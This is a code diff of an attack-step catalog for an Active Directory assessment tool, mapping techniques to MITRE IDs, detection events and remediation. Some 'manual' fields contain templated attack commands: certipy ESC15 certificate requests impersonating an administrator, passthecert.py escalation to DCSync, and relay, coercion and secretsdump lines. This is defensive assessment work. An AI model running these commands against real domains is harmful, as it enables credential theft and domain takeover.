         category="acl_ace",
         description="Read LAPS local administrator password",
         vuln_key="laps_readable",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Restrict read access on ms-Mcs-AdmPwd (legacy LAPS) or "
@@ -1830,6 +2134,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="acl_ace",
         description="Read/replicate LAPS password material",
         vuln_key="laps_readable",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Restrict SyncLAPSPassword (DS-Sync-LAPS-Password) right to LAPS admin groups only."
@@ -1850,6 +2155,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="low",
         category="acl_ace",
         description="Rewrite ACLs to grant further privileges",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "For each affected object listed in the per-path remediation steps and the "
@@ -1880,6 +2187,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="low",
         category="acl_ace",
         description="Take ownership to unlock privilege escalation",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "For each affected object listed in the per-path remediation steps and the "
@@ -1910,6 +2219,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         description=(
             "Modify account-restriction property sets on the target user/computer object"
         ),
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Remove WriteAccountRestrictions from non-privileged principals on the "
@@ -1932,6 +2243,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="high",
         category="acl_ace",
         description="Set SPN to force kerberoastable ticket generation",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Remove write access to servicePrincipalName attribute for non-privileged principals. "
@@ -2009,6 +2322,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "boundary and can be captured from a compromised trusted forest"
         ),
         vuln_key="trust_tgt_delegation_enabled",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Disable TGT delegation on the forest trust so ticket-granting tickets "
@@ -2065,6 +2379,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "using the shared forest trust key"
         ),
         vuln_key="raise_child_forest_root",
+        source_tier_gated=False,
         remediation_complexity="high",
         remediation_effort=(
             "Treat every domain in the forest as a single Tier-0 security boundary: "
@@ -2107,6 +2422,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="high",
         category="acl_ace",
         description="Write the user's logon script path to attacker-controlled content",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Remove write access to the scriptPath attribute for non-privileged principals. "
@@ -2177,6 +2494,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="low",
         category="acl_ace",
         description="Write msDS-KeyCredentialLink to add shadow credentials",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Remove write access to the msDS-KeyCredentialLink attribute for non-privileged principals. "
@@ -2203,7 +2522,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         ),
         category="acl_ace",
         description="Broad extended rights over directory object",
-        vuln_key="all_extended_rights",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Audit and remove AllExtendedRights grants from non-privileged principals. "
@@ -2232,6 +2552,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="credential_access",
         description="Replicate AD secrets remotely from domain controller",
         vuln_key="dcsync",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Remove GetChanges (DS-Replication-Get-Changes) and GetChangesAll "
@@ -2353,6 +2674,44 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         bh_cypher_names=("DumpDPAPI",),
     ),
     _entry(
+        "dumpsam",
+        support_kind="supported",
+        support_reason=(
+            "Reads the SAM and SYSTEM registry hives on the compromised host and parses "
+            "the local account password hashes out of them."
+        ),
+        # LATERAL-credential follow-up (see
+        # ``services/post_exploitation/access_followups.py``): the recovered
+        # material belongs to the host's LOCAL accounts, a DIFFERENT principal
+        # from the host machine account, so this does not "become" the host.
+        compromise_semantics="direct_target_compromise",
+        # Reading HKLM\SAM requires an administrator (SYSTEM) session on the host,
+        # exactly like its dumplsa / dumplsass / dumpdpapi siblings. Stated
+        # explicitly because the module default is ``user_credentials``, which
+        # would let a user-level prior session (CanRDP / CanPSRemote) wrongly
+        # satisfy the carry-forward requirement and offer a dump that cannot run.
+        source_context_requirement="local_admin_session",
+        category="credential_access",
+        description="Local account hash extraction from the SAM database",
+        remediation_complexity="medium",
+        remediation_effort=(
+            "Stop local account hashes from being reusable across hosts: enforce unique "
+            "local administrator passwords with Windows LAPS so one recovered hash opens "
+            "one machine, and set the UAC remote-restriction policy "
+            "(LocalAccountTokenFilterPolicy left at its default) so local accounts cannot "
+            "authenticate remotely at all. Disable or rename unused local accounts and "
+            "leave the built-in Administrator disabled where it is not required. The read "
+            "itself cannot be fully prevented from a SYSTEM session, so restrict local "
+            "admin rights, disable Remote Registry where it is not needed, and audit "
+            "object access to the SAM and SYSTEM registry hives."
+        ),
+        can_fully_mitigate=True,
+        mitre_technique_id="T1003.002",
+        mitre_technique_name="OS Credential Dumping: Security Account Manager",
+        detection_event_ids=("4663", "4656", "4688"),
+        bh_cypher_names=("DumpSAM",),
+    ),
+    _entry(
         "dumplsass",
         support_kind="supported",
         support_reason=(
@@ -2415,6 +2774,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="coercion",
         description="Coerce machine authentication via DFS endpoint behavior",
         vuln_key="dfscoerce",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Block MS-DFSNM RPC calls to DCs via firewall. "
@@ -2435,6 +2795,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="coercion",
         description="MS-EFSRPC coercion path (PetitPotam)",
         vuln_key="petitpotam",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Apply CVE-2021-36942 patch. Enable EPA on AD CS HTTP endpoints. "
@@ -2455,6 +2816,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="coercion",
         description="Spooler coercion path (PrinterBug)",
         vuln_key="printerbug",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Disable the Print Spooler service on all DCs and servers that do not require it. "
@@ -2481,7 +2843,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1087.002",
         mitre_technique_name="Account Discovery: Domain Account",
-        detection_event_ids=(),
+        detection_event_ids=NO_NATIVE_EVENT_TELEMETRY,
         bh_cypher_names=("LDAPAnonymousBind",),
     ),
     _entry(
@@ -2580,7 +2942,11 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1552.001",
         mitre_technique_name="Unsecured Credentials: Credentials In Files",
-        detection_event_ids=(),
+        # Reading credentials out of share content is seen the way every other
+        # share access in this catalog is seen (ReadShare, FullControlShare):
+        # 5140 records the connection to the share and 5145 the file-level
+        # access, which carries the relative path of the file that held them.
+        detection_event_ids=("5140", "5145"),
         bh_cypher_names=("PasswordInShare",),
     ),
     _entry(
@@ -2599,7 +2965,12 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1552.001",
         mitre_technique_name="Unsecured Credentials: Credentials In Files",
-        detection_event_ids=(),
+        # Host filesystem artifacts, so the same object-access pair the
+        # credential dumps are hunted on (DumpLSA, DumpDPAPI): 4656 for the
+        # handle request and 4663 for the read, both subject to object-access
+        # auditing on the file, plus 5145 when the artifact is reached over an
+        # administrative share rather than locally.
+        detection_event_ids=("4656", "4663", "5145"),
         bh_cypher_names=("PasswordInFile",),
     ),
     _entry(
@@ -2618,7 +2989,11 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1552.006",
         mitre_technique_name="Unsecured Credentials: Group Policy Preferences",
-        detection_event_ids=(),
+        # The cpassword is read out of SYSVOL, which is a share on the domain
+        # controller, so it is the share-access pair: 5140 for the SYSVOL
+        # connection and 5145 for the access to the Preferences XML, whose
+        # relative path the event names.
+        detection_event_ids=("5140", "5145"),
         bh_cypher_names=("GPPPassword",),
     ),
     # ── Share access ────────────────────────────────────────────────────────
@@ -2722,6 +3097,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "machine NT hash."
         ),
         vuln_key="ntlmv1_enabled",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Disable NTLMv1 by setting LmCompatibilityLevel to 3 or higher via GPO "
@@ -2767,6 +3143,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "access on the victim via S4U."
         ),
         vuln_key="ntlmv1_relay_rbcd",
+        source_tier_gated=False,
         remediation_complexity="high",
         remediation_effort=(
             "Disable NTLMv1 (LmCompatibilityLevel ≥ 3) via GPO; enforce LDAP signing "
@@ -2807,6 +3184,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "key credential, and recovers the victim's machine NT hash via PKINIT."
         ),
         vuln_key="ntlmv1_relay_shadowcreds",
+        source_tier_gated=False,
         remediation_complexity="high",
         remediation_effort=(
             "Disable NTLMv1 (LmCompatibilityLevel ≥ 3); enforce LDAP signing and "
@@ -2860,6 +3238,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "viability, LDAP signing, channel binding, ADCS, or DC count."
         ),
         vuln_key="ntlmv1_crack",
+        source_tier_gated=False,
         remediation_complexity="high",
         remediation_effort=(
             "Disable NTLMv1 (LmCompatibilityLevel ≥ 3) via GPO and remove "
@@ -2919,6 +3298,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "domain credential without any prior access."
         ),
         vuln_key="smb_relay_targets",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Disable multicast and broadcast name resolution so there is nothing to "
@@ -3420,6 +3800,36 @@ def finding_basis_for_relation(relation: str) -> FindingBasis:
     return entry.finding_basis
 
 
+def source_tier_gated_for_relation(relation: str) -> bool:
+    """Return whether *relation*'s finding is TIER-GATED (vs always-fire CONDITION).
+
+    ``True`` means the finding fires only when the SOURCE PRINCIPAL crosses a
+    boundary it should not (the tier-jump SSOT gate in
+    :mod:`adscan_internal.services.attack_graph_findings`): DCSync, the generic
+    control group, constrained delegation, RBCD write, LAPS/gMSA read, the ADCS
+    ESCs. ``False`` is a CONDITION finding that always fires on its condition
+    (kerberoast / asreproast, SMBv1, the CVEs, unconstrained delegation, the
+    privileged-session finding, …) — it BYPASSES the tier-jump gate.
+
+    An unknown relation resolves to ``False`` — the safe direction: a CONDITION
+    finding is never silently suppressed by a gate it should not have reached.
+    The per-entry :attr:`AttackStepCatalogEntry.source_tier_gated` flag is the
+    SSOT; a ``vuln_key``-bearing entry that leaves it ``None`` fails CI
+    (``tests/unit/test_catalog_source_tier_gated_total.py``).
+
+    Args:
+        relation: A graph edge's ``relation`` token, in any casing.
+
+    Returns:
+        ``True`` for a tier-gated finding, ``False`` for a CONDITION finding or
+        an unknown relation.
+    """
+    entry = get_attack_step_entry(normalize_execution_relation(relation))
+    if entry is None:
+        return False
+    return bool(entry.source_tier_gated)
+
+
 def get_exploitation_relation_vuln_keys() -> dict[str, str]:
     """Return relation->vuln_key mappings for exploitation-style classification."""
     return {
@@ -3733,7 +4143,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
     },
     "passwordinshare": {
         "short": (
-            "{source} recovered a stored credential from a file on an SMB "
+            "{actor} recovered a stored credential from a file on an SMB "
             "share. {share_secret_access_clause}"
         ),
         "long": (
@@ -3781,8 +4191,8 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
     },
     "backupoperatorescalation": {
         "short": (
-            "Backup Operators membership grants {source} SeBackupPrivilege, which "
-            "lets it read the domain controller's registry hives (SAM, SECURITY, "
+            "Backup Operators membership grants {actor} SeBackupPrivilege, which "
+            "lets that account read the domain controller's registry hives (SAM, SECURITY, "
             "SYSTEM) and the NTDS database, recovering credential material up to "
             "the DC machine account and domain secrets."
         ),
@@ -3790,8 +4200,8 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "The Backup Operators group is granted SeBackupPrivilege so its members "
             "can back up any file regardless of its ACL, which by design includes "
             "the registry hives and the ntds.dit database on a domain controller. "
-            "An account that controls a Backup Operators member, in this path "
-            "{source}, can turn that privilege into credential theft in two ways. "
+            "In this path the privilege belongs to {actor}, and that account can "
+            "turn it into credential theft in two ways. "
             "It can read the SECURITY, SYSTEM, and SAM hives remotely and recover "
             "the local SAM accounts and LSA secrets, including the domain "
             "controller's own machine-account key. It can also take a shadow copy "
@@ -3861,7 +4271,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "entry vector for an unauthenticated or low-privileged attacker. The "
             "only prerequisite is a valid list of usernames, and that list is "
             "cheap to obtain: anonymous or authenticated LDAP enumeration of the "
-            "directory returns every sAMAccountName. In this path {source} uses "
+            "directory returns every sAMAccountName. In this path {actor} uses "
             "that foothold against {target}."
         ),
         "manual": (
@@ -3916,7 +4326,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "single account is locked out. This pattern tends to survive on "
             "service, test, and default accounts that were created quickly and "
             "never revisited, which is why it stays a dependable entry vector on "
-            "large or loosely maintained directories. In this path {source} uses "
+            "large or loosely maintained directories. In this path {actor} uses "
             "that foothold against {target}."
         ),
         "manual": (
@@ -3976,7 +4386,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "confirm a working login. No privilege escalation or cracking is "
             "required: the credential is simply sitting in a world-readable "
             "field. It stays a low-effort entry vector on domains with loose "
-            "hygiene, and in this path {source} uses a value recovered this way "
+            "hygiene, and in this path {actor} uses a value recovered this way "
             "against {target}."
         ),
         "manual": (
@@ -4162,8 +4572,8 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "remediation": (
             "Remove the WriteDACL ACE that {source} holds on {target} (distinguished name "
-            '`{target_dn}`). List what {source} currently holds on it with `(Get-Acl '
-            '"AD:\\{target_dn}").Access | Where-Object IdentityReference -like \'*{source_identity}*\'`, '
+            "`{target_dn}`). List what {source} currently holds on it with `(Get-Acl "
+            "\"AD:\\{target_dn}\").Access | Where-Object IdentityReference -like '*{source_identity}*'`, "
             'then delete those entries with `dsacls "{target_dn}" /R "{netbios_domain}\\{source_identity}"`. '
             "Before: the entry reads ActiveDirectoryRights=WriteDacl, AccessControlType=Allow. After: "
             "the same query returns nothing for that principal.",
@@ -4532,6 +4942,20 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "impacket-krbrelayx -t ldap://{dc_ip} --victim {target_hostname}\n"
             "# Coerce a privileged account (e.g. a DC) to authenticate to {source}:\n"
             "impacket-printerbug {domain}/{executing_principal}:<pass>@<target_dc> <source_ip>"
+        ),
+        "verify_windows": (
+            "Confirm {source} is trusted for unconstrained delegation and check "
+            "the coercion mitigations:\n"
+            "Get-ADComputer -LDAPFilter "
+            "'(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties "
+            "TrustedForDelegation | Select-Object Name, TrustedForDelegation\n"
+            "# Confirm sensitive accounts are marked 'Account is sensitive and "
+            "cannot be delegated' or are in Protected Users."
+        ),
+        "verify_linux": (
+            "Enumerate unconstrained-delegation hosts (read-only):\n"
+            "nxc ldap {dc_ip} -u <user> -p <pass> --trusted-for-delegation\n"
+            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
         ),
         "remediation": (
             "Remove TRUSTED_FOR_DELEGATION from {source} unless strictly required; prefer constrained or resource-based delegation.",
@@ -5337,25 +5761,44 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "long": (
             "ADCS ESC15 (also called EKUwu, CVE-2024-49019) abuses a schema "
             "version 1 certificate template that allows the enrollee to supply the "
-            "subject (ENROLLEE_SUPPLIES_SUBJECT). On a V1 template the requester "
-            "can additionally inject arbitrary application policies into the "
-            "request. {source_type} {source}, holding enrollment rights on "
-            "{template} with no manager approval, requests a certificate supplying "
-            "both a privileged subject and a Client Authentication application "
-            "policy, even if the template's own EKU would not normally allow "
-            "authentication. The resulting certificate authenticates as the "
-            "privileged victim via PKINIT (or as a server for a Schannel path), "
-            "compromising {target}."
+            "subject (ENROLLEE_SUPPLIES_SUBJECT). On a V1 template the certification "
+            "authority honours application policies the requester injects into the "
+            "request, overriding the template's configured EKU. {source_type} "
+            "{source}, holding enrollment rights on {template} with no manager "
+            "approval, abuses this one of two documented ways. Method A (Schannel "
+            "/ Pass-the-Certificate): inject a Client Authentication application "
+            "policy and set the subject alternative name to the victim, then "
+            "present the issued certificate on an LDAPS bind (SASL EXTERNAL) as the "
+            "victim. This is the fewer-dependency route (one certificate, one "
+            "template, no enrollment agent); it cannot use PKINIT because the "
+            "certificate's EKU stays Server Authentication, so the identity is "
+            "asserted over Schannel. Method B (on-behalf-of): inject a Certificate "
+            "Request Agent application policy, use the issued certificate as an "
+            "enrollment agent to request a second certificate on behalf of the "
+            "victim from a client-authentication template, then authenticate that "
+            "second certificate via PKINIT. Either route compromises {target}."
         ),
         "manual": (
             "# Enumerate ADCS and confirm the V1 enrollee-supplies-subject template:\n"
             "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
-            "# Request a cert injecting a client-auth application policy and a "
-            "privileged subject, then authenticate:\n"
+            "# Method A (Schannel / Pass-the-Certificate): request a cert injecting a\n"
+            "# Client Authentication application policy + the victim's UPN, then bind\n"
+            "# to LDAPS with it and perform the LDAP takeover (e.g. grant DCSync):\n"
             "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template} -upn administrator@{domain} "
             "-application-policies 'Client Authentication'\n"
+            "passthecert.py -action modify_user -crt administrator.crt "
+            "-key administrator.key -domain {domain} -dc-ip {dc_ip} "
+            "-target administrator -elevate\n"
+            "# Method B (on-behalf-of enrollment agent): request an enrollment-agent\n"
+            "# cert, use it to enroll on behalf of the victim, then PKINIT:\n"
+            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-ca <ca_name> -template {template} "
+            "-application-policies 'Certificate Request Agent'\n"
+            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "-ca <ca_name> -template User -on-behalf-of '{domain}\\administrator' "
+            "-pfx {executing_principal}.pfx\n"
             "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
         ),
         "verify_windows": (
@@ -5509,6 +5952,81 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "Enforce LDAP channel binding and SMB signing, and prefer Kerberos "
             "over NTLM, so a rogue server-auth certificate cannot be leveraged into "
             "a relay or interception position.",
+        ),
+    },
+    "certighost": {
+        "short": (
+            "Certighost (CVE-2026-54121): the certificate authority {target} "
+            "trusts a requester-supplied domain controller, so {source} can obtain "
+            "a certificate that authenticates as a domain controller and take over "
+            "the domain."
+        ),
+        "long": (
+            "Certighost (CVE-2026-54121) abuses the certificate authority's "
+            "domain-controller chase fallback. When a certificate request cannot "
+            "be matched to a known machine, an unpatched certificate authority "
+            "reads the requester-supplied cdc (client domain controller) and rmd "
+            "(remote machine object) request attributes and contacts the supplied "
+            "host as though it were a real domain controller, without verifying "
+            "that it is one. {source_type} {source}, holding only ordinary domain "
+            "credentials, points the certificate authority {target} at an "
+            "attacker-controlled host that presents a forged domain-controller "
+            "identity and receives a certificate that authenticates as a domain "
+            "controller. Authenticating with that certificate through Kerberos "
+            "PKINIT yields a ticket as the domain controller machine account, "
+            "which carries directory replication rights and leads to full domain "
+            "credential extraction. The avenue is reachable only when the "
+            "certificate authority has the chase fallback enabled "
+            "(EDITF_ENABLECHASECLIENTDC) and its host has not received the July "
+            "2026 update that adds domain-controller validation. ADscan reports "
+            "this exposure from read-only configuration and patch-level analysis "
+            "and does not request a certificate or change the environment."
+        ),
+        "manual": (
+            "# Read-only confirmation: check the CA policy flag and host patch "
+            "level (no certificate requested):\n"
+            "certutil -getreg policy\\EditFlags   # look for "
+            "EDITF_ENABLECHASECLIENTDC\n"
+            "# Exploitation (deferred, lab-only) injects the cdc / rmd request "
+            "attributes so the CA chases an attacker host acting as a DC, then "
+            "PKINIT -> DCSync. Public proof-of-concept and research:\n"
+            "#   python3 certighost_poc.py -u <user>@example.local -p '<pass>' "
+            "-dc-ip {dc_ip} -ca '<ca_name>' -rogue-dc <attacker_host>\n"
+            "# Reference: https://kudelskisecurity.com/research/certighost"
+        ),
+        "verify_windows": (
+            "Confirm the certificate authority has the chase fallback enabled and "
+            "whether its host carries the July 2026 update. Run on or against the "
+            "CA host:\n"
+            "certutil -getreg policy\\EditFlags   # EDITF_ENABLECHASECLIENTDC "
+            "present means the fallback is on\n"
+            "Get-HotFix | Sort-Object InstalledOn -Descending | "
+            "Select-Object -First 5"
+        ),
+        "verify_linux": (
+            "Read-only ADCS enumeration that reads the CA EditFlags (no "
+            "certificate requested):\n"
+            "certipy find -u <user>@example.local -p <pass> -dc-ip {dc_ip} "
+            "-stdout\n"
+            "# Reference: https://kudelskisecurity.com/research/certighost"
+        ),
+        "remediation": (
+            "Apply the July 2026 Microsoft security update on the certificate "
+            "authority host so the chase path validates that the supplied host is "
+            "a genuine domain controller before trusting it.",
+            "Disable the chase fallback on the certificate authority by clearing "
+            "the EDITF_ENABLECHASECLIENTDC policy flag and restarting the CA "
+            "service (certutil -setreg policy\\EditFlags "
+            "-EDITF_ENABLECHASECLIENTDC, then net stop certsvc and net start "
+            "certsvc), unless an operational dependency genuinely requires it, and "
+            "confirm the change with certutil -getreg policy\\EditFlags.",
+            "Enforce strong certificate mapping on domain controllers "
+            "(StrongCertificateBindingEnforcement per KB5014754) so a mis-issued "
+            "certificate cannot be mapped to a domain controller account.",
+            "Monitor certificate issuance for domain-controller certificates "
+            "requested by non-domain-controller principals (Event IDs 4886 and "
+            "4887 on the CA) and review machine-account and Kerberos activity "
+            "(4741, 4768, 4769) for impersonation.",
         ),
     },
     "petitpotam": {
@@ -5749,66 +6267,6 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "(KB5005413).",
             "Prefer Kerberos over NTLM, and disable NTLM where feasible, so a "
             "coerced authentication yields nothing that can be relayed.",
-        ),
-    },
-    "coercetotgt": {
-        "short": (
-            "Coerce-to-TGT: {source} forces {target} to authenticate and combines "
-            "the coerced machine authentication with unconstrained delegation to "
-            "capture the victim's Kerberos TGT."
-        ),
-        "long": (
-            "Coerce-to-TGT chains a coercion primitive with unconstrained "
-            "delegation. When {source_type} {source} controls a host that is "
-            "trusted for unconstrained delegation, any account that authenticates "
-            "to it via Kerberos leaves a forwardable TGT cached in that host's "
-            "memory. The attacker uses a coercion trigger (PetitPotam / PrinterBug "
-            "/ DFSCoerce) to force {target} (ideally a domain controller) to "
-            "authenticate to the delegation-trusted host, then extracts the "
-            "victim's TGT from the ticket cache. With a DC's TGT the attacker can "
-            "act as the domain controller and replicate directory secrets, "
-            "compromising {target}. The technique turns 'a machine can be coerced' "
-            "plus 'a host has unconstrained delegation' into full domain "
-            "compromise."
-        ),
-        "manual": (
-            "# On the unconstrained-delegation host, capture inbound TGTs while "
-            "coercing the target:\n"
-            "krbrelayx.py -u <user> -p <pass>   # listens and extracts forwarded "
-            "TGTs\n"
-            "# Coerce the DC to authenticate to the delegation host:\n"
-            "coercer coerce -u <user> -p <pass> -t {target_hostname} -l <deleg_host>\n"
-            "# Use the captured DC TGT (e.g. to replicate secrets):\n"
-            "impacket-secretsdump -k -no-pass -dc-ip {dc_ip} {target_hostname}"
-        ),
-        "verify_windows": (
-            "Find hosts trusted for unconstrained delegation (the prerequisite for "
-            "this chain) and confirm coercion mitigations:\n"
-            "Get-ADComputer -LDAPFilter "
-            "'(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties "
-            "TrustedForDelegation | Select-Object Name, TrustedForDelegation\n"
-            "# Confirm sensitive accounts are marked 'Account is sensitive and "
-            "cannot be delegated' or are in Protected Users."
-        ),
-        "verify_linux": (
-            "Enumerate unconstrained-delegation hosts and the target's coercion "
-            "methods (read-only):\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> --trusted-for-delegation\n"
-            "coercer scan -u <user> -p <pass> -t {target_hostname} -l <attacker_ip>\n"
-            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
-        ),
-        "remediation": (
-            "Remove unconstrained delegation from every host that does not "
-            "strictly require it (Set-ADComputer -Identity <host> "
-            "-TrustedForDelegation $false); migrate any legitimate need to "
-            "constrained or resource-based constrained delegation.",
-            "Add privileged accounts to the Protected Users group and set 'Account "
-            "is sensitive and cannot be delegated' so their TGTs are never "
-            "forwardable to a delegation host.",
-            "Reduce the coercion surface: disable the Print Spooler on servers that "
-            "do not print and apply Microsoft's EFSRPC coercion guidance.",
-            "Enforce SMB signing and prefer Kerberos-only authentication with "
-            "strong mitigations so coerced authentication cannot be abused.",
         ),
     },
     "zerologon": {
@@ -6093,7 +6551,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
         ),
         "remediation": (
-            "Enumerate the effective local administrators on the host and remove every principal that does not require them: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
+            "Enumerate the effective local administrators on the host and remove every principal that does not require them: Invoke-Command -ComputerName {target_hostname} -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
             "Replace broad, GPO-pushed 'all workstation admins' groups with narrowly-scoped, per-tier groups so a single group cannot make one account admin on hundreds of machines; audit the nesting with Get-ADGroupMember -Recursive.",
             "Deploy LAPS so each host has a unique, rotated local Administrator password, removing the shared-local-admin lateral-movement path.",
             "Enforce tier separation (ESAE): Tier-0 admins must never log on to Tier-1/Tier-2 hosts, so their credentials are never cached where a member-server compromise can reach them. Monitor Event IDs 4624/4672 for privileged logons to unexpected hosts.",
@@ -6141,7 +6599,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
         ),
         "remediation": (
-            "Review the Remote Desktop Users group on the host and remove principals that do not need interactive access: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Remote Desktop Users' }.",
+            "Review the Remote Desktop Users group on the host and remove principals that do not need interactive access: Invoke-Command -ComputerName {target_hostname} -ScriptBlock { Get-LocalGroupMember -Group 'Remote Desktop Users' }.",
             "Require Network Level Authentication and, for administrative RDP, enable Restricted Admin mode (Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DisableRestrictedAdmin -Value 0) so credentials are not left recoverable in the session.",
             "Restrict which source hosts may reach TCP 3389 with a host firewall / network segmentation rule so RDP is not exposed broadly across the estate.",
             "Add high-value accounts to the Protected Users group and enforce tier separation so Tier-0 credentials never RDP into member servers. Monitor Event IDs 4624 (logon type 10) and 4778 for interactive RDP sessions.",
@@ -6191,7 +6649,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
         ),
         "remediation": (
-            "Audit the Remote Management Users group on the host and remove principals that do not need remote PowerShell: Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Remote Management Users' }.",
+            "Audit the Remote Management Users group on the host and remove principals that do not need remote PowerShell: Invoke-Command -ComputerName {target_hostname} -ScriptBlock { Get-LocalGroupMember -Group 'Remote Management Users' }.",
             "Restrict the PowerShell endpoint permission (Get-PSSessionConfiguration | Set-PSSessionConfiguration) to the specific administration group, and prefer constrained (JEA) session configurations that expose only the cmdlets a role needs.",
             "Limit which source hosts may reach TCP 5985/5986 through the host firewall, and require HTTPS (5986) so remoting credentials and traffic are encrypted end to end.",
             "Enable PowerShell script-block and module logging (Event ID 4104) plus WinRM operational logging so remote execution is recorded, and enforce tier separation so Tier-0 accounts never remote into member servers.",
@@ -6237,7 +6695,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Reference: https://www.thehacker.recipes/ad/movement/dcom"
         ),
         "remediation": (
-            "Remove unnecessary local administrator rights on the host (the prerequisite for DCOM execution): Invoke-Command -ComputerName <host> -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
+            "Remove unnecessary local administrator rights on the host (the prerequisite for DCOM execution): Invoke-Command -ComputerName {target_hostname} -ScriptBlock { Get-LocalGroupMember -Group 'Administrators' }.",
             "Tighten DCOM launch and activation permissions via dcomcnfg (Component Services > DCOM Config) so only required identities can remotely activate COM objects, and remove Everyone/Authenticated Users from Remote Launch/Remote Activation where present.",
